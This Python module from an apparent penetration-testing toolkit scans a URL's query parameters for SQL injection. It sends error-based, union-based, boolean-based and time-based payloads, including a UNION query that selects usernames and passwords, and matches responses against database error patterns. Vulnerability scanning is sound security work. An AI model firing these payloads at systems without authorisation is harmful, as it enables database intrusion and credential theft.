"""SQL Injection vulnerability scanner.

Tests URL parameters for SQL injection vulnerabilities using multiple techniques
including error-based, union-based, boolean-based, and time-based detection.
"""

import asyncio
import time
import re
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysqli?",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"Unknown column '.*?' in",
        r"mysql_fetch",
        r"com\.mysql\.jdbc",
    ],
    "MSSQL": [
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"(\bODBC SQL Server Driver\b)",
        r"SQLServer JDBC Driver",
        r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for SQL Server",
        r"com\.microsoft\.sqlserver\.jdbc",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\bpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "Oracle": [
        r"\bORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?\boci_",
        r"quoted string not properly terminated",
        r"java\.sql\.SQLException.*?Oracle",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?sqlite_",
        r"Warning.*?SQLite3::",
        r"\[SQLITE_ERROR\]",
    ],
}

ERROR_BASED_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 100--", "1 OR 1=1",
    "' UNION SELECT NULL--", "') OR ('1'='1",
    "1; SELECT 1--", "' AND 1=CONVERT(int, @@version)--",
]

UNION_BASED_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,@@version,3--",
    "' UNION SELECT username,password FROM users--",
]

BOOLEAN_BASED_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

TIME_BASED_PAYLOADS = [
    "' OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--",
    "1; SELECT SLEEP(3)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]


class SqlInjectionScannerModule(AtsModule):
    """Scan URL parameters for SQL injection vulnerabilities."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="sql_injection_scanner",
            category=ModuleCategory.PENTEST,
            description="Test URL parameters for SQL injection vulnerabilities using error, union, boolean, and time-based techniques",
            version="1.0.0",
            parameters=[
                Parameter(name="url", type=ParameterType.URL,
                          description="Target URL with query parameters to test", required=True),
                Parameter(name="techniques", type=ParameterType.CHOICE,
                          description="SQL injection technique to test",
                          choices=["all", "error_based", "union_based", "boolean_based", "time_based"],
                          default="all"),
                Parameter(name="parameters", type=ParameterType.STRING,
                          description="Comma-separated list of specific parameters to test (empty = all)",
                          required=False, default=""),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list", description="Detected SQL injection vulnerabilities"),
                OutputField(name="summary", type="dict", description="Scan summary with statistics"),
            ],
            tags=["pentest", "sqli", "injection", "web", "database"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: dict[str, Any]) -> tuple[bool, str]:
        url = config.get("url", "").strip()
        if not url:
            return False, "URL is required"
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_params(self, url: str, param_filter: str) -> list[str]:
        """Extract query parameters from the URL, optionally filtering."""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        if param_filter:
            selected = [p.strip() for p in param_filter.split(",") if p.strip()]
            params = [p for p in params if p in selected]
        return params

    def _build_injected_url(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the injection payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _check_sql_errors(self, body: str) -> list[dict[str, str]]:
        """Check response body for SQL error messages."""
        findings = []
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    findings.append({"database": db_type, "pattern": pattern})
                    break
        return findings

    async def _test_error_based(self, session: aiohttp.ClientSession, url: str,
                                 param: str) -> list[dict[str, Any]]:
        """Test for error-based SQL injection."""
        vulnerabilities = []
        for payload in ERROR_BASED_PAYLOADS:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False) as resp:
                    body = await resp.text(errors="replace")
                    errors = self._check_sql_errors(body)
                    if errors:
                        vulnerabilities.append({
                            "type": "error_based", "parameter": param, "payload": payload,
                            "evidence": errors, "severity": "high",
                            "url": injected_url[:500],
                        })
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return vulnerabilities

    async def _test_union_based(self, session: aiohttp.ClientSession, url: str,
                                 param: str) -> list[dict[str, Any]]:
        """Test for union-based SQL injection."""
        vulnerabilities = []
        for payload in UNION_BASED_PAYLOADS:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False) as resp:
                    body = await resp.text(errors="replace")
                    errors = self._check_sql_errors(body)
                    if errors or ("UNION" in payload.upper() and resp.status == 200
                                  and len(body) > 0):
                        if errors:
                            vulnerabilities.append({
                                "type": "union_based", "parameter": param, "payload": payload,
                                "evidence": errors, "severity": "high",
                                "url": injected_url[:500],
                            })
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return vulnerabilities

    async def _test_boolean_based(self, session: aiohttp.ClientSession, url: str,
                                   param: str) -> list[dict[str, Any]]:
        """Test for boolean-based blind SQL injection."""
        vulnerabilities = []
        for true_payload, false_payload in BOOLEAN_BASED_PAYLOADS:
            true_url = self._build_injected_url(url, param, true_payload)
            false_url = self._build_injected_url(url, param, false_payload)
            try:
                async with session.get(true_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False) as resp_true:
                    true_body = await resp_true.text(errors="replace")
                    true_len = len(true_body)
                    true_status = resp_true.status

                async with session.get(false_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False) as resp_false:
                    false_body = await resp_false.text(errors="replace")
                    false_len = len(false_body)
                    false_status = resp_false.status

                if true_status == false_status and abs(true_len - false_len) > 50:
                    vulnerabilities.append({
                        "type": "boolean_based", "parameter": param,
                        "payload_true": true_payload, "payload_false": false_payload,
                        "evidence": f"Response length diff: {true_len} vs {false_len}",
                        "severity": "medium",
                    })
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return vulnerabilities

    async def _test_time_based(self, session: aiohttp.ClientSession, url: str,
                                param: str) -> list[dict[str, Any]]:
        """Test for time-based blind SQL injection."""
        vulnerabilities = []
        # First get baseline response time
        baseline_url = self._build_injected_url(url, param, "1")
        baseline_time = 0.0
        try:
            start = time.perf_counter()
            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10),
                                   ssl=False) as _:
                baseline_time = time.perf_counter() - start
        except (aiohttp.ClientError, asyncio.TimeoutError):
            baseline_time = 1.0

        for payload in TIME_BASED_PAYLOADS:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                start = time.perf_counter()
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=15),
                                       ssl=False) as _:
                    elapsed = time.perf_counter() - start
                    if elapsed > baseline_time + 2.5:
                        vulnerabilities.append({
                            "type": "time_based", "parameter": param, "payload": payload,
                            "evidence": f"Response delayed by {elapsed - baseline_time:.1f}s",
                            "severity": "high",
                        })
            except asyncio.TimeoutError:
                vulnerabilities.append({
                    "type": "time_based", "parameter": param, "payload": payload,
                    "evidence": "Request timed out (possible sleep injection)",
                    "severity": "medium",
                })
            except aiohttp.ClientError:
                continue
        return vulnerabilities

    async def execute(self, config: dict[str, Any]) -> dict[str, Any]:
        url = config["url"].strip()
        techniques = config.get("techniques", "all")
        param_filter = config.get("parameters", "")

        params = self._extract_params(url, param_filter)
        if not params:
            return {
                "vulnerabilities": [],
                "summary": {"error": "No query parameters found in URL to test",
                            "url": url, "total_tests": 0, "vulnerabilities_found": 0},
            }

        all_vulns: list[dict[str, Any]] = []
        total_tests = 0
        connector = aiohttp.TCPConnector(limit=5, ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            for param in params:
                if techniques in ("all", "error_based"):
                    vulns = await self._test_error_based(session, url, param)
                    all_vulns.extend(vulns)
                    total_tests += len(ERROR_BASED_PAYLOADS)

                if techniques in ("all", "union_based"):
                    vulns = await self._test_union_based(session, url, param)
                    all_vulns.extend(vulns)
                    total_tests += len(UNION_BASED_PAYLOADS)

                if techniques in ("all", "boolean_based"):
                    vulns = await self._test_boolean_based(session, url, param)
                    all_vulns.extend(vulns)
                    total_tests += len(BOOLEAN_BASED_PAYLOADS)

                if techniques in ("all", "time_based"):
                    vulns = await self._test_time_based(session, url, param)
                    all_vulns.extend(vulns)
                    total_tests += len(TIME_BASED_PAYLOADS)

        summary = {
            "url": url,
            "parameters_tested": params,
            "techniques_used": techniques,
            "total_tests": total_tests,
            "vulnerabilities_found": len(all_vulns),
            "severity_breakdown": {
                "high": sum(1 for v in all_vulns if v.get("severity") == "high"),
                "medium": sum(1 for v in all_vulns if v.get("severity") == "medium"),
                "low": sum(1 for v in all_vulns if v.get("severity") == "low"),
            },
        }

        self.logger.info("sqli_scan_complete", total_vulns=len(all_vulns), tests=total_tests)
        return {"vulnerabilities": all_vulns, "summary": summary}
